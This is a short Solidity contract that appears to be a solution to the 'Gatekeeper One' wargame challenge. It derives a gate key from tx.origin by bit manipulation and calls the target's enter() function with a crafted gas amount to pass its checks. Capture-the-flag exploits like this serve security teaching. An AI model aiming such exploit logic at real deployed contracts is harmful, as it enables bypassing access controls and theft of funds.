// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperOneAttack {
    IGatekeeperOne public challenge;

    constructor(address challengeAddress) {
        challenge = IGatekeeperOne(challengeAddress);
    }

    function attack(uint256 gas) public {
        uint16 k16 = uint16(uint160(tx.origin));
        uint64 k64 = uint64(1 << 63) + uint64(k16);
        bytes8 key = bytes8(k64);

        challenge.enter{gas: 8191 * 10 + gas}(key);
    }
}
